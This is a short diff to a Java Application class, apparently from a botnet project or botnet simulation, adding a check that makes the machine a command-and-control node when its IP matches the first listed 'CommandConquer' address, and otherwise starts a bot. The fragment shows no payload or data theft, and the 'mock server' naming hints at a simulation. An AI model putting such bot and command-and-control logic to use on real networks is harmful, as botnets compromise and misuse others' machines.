@@ -52,6 +52,9 @@ public class Application {
 			init.loadInfo();
 			nServ.firstConnectToMockServerDns();
 						
+			if(nServ.getCommandConquerIps().getList().get(0).getValue1().getIp().equals(nServ.getMyIp().getIp()))
+				configEngine.setCommandandconquerStatus(true);
+			
 			if (!configEngine.isCommandandconquerStatus()) {
 				bot.initializeBot();
 
